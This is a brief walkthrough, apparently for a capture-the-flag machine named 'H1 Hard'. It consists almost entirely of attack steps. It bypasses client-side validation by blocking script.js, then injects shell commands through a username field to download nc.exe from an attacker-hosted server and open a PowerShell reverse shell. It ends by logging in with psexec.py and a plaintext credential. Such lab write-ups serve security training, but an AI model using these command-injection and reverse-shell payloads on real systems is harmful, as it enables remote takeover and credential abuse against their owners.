# H1 Hard
## Step 1
1. goto -> `http://$IP/signup` and sign up.
2. `profile -> change username`
3. Right Click -> Inspect -> Netwok -> Right Click to script.js and click to Block URL
4. `cd webserver; python -m http.server 8080`.
5. Paste `jin | powershell curl YOUR_IP:8000/nc.exe -o nc.exe` to change username
## Step 2
1. Paste `nc -nvlp 45789` on your terminal and execute
2. Paste `jin | nc.exe YOUR_IP 45789 -e powershell` to change username
3. Paste `python3 psexec.py $IP/achilles:winniethepooh@$IP` to terminal
4. Done
5. Now, check blue team windows notes.
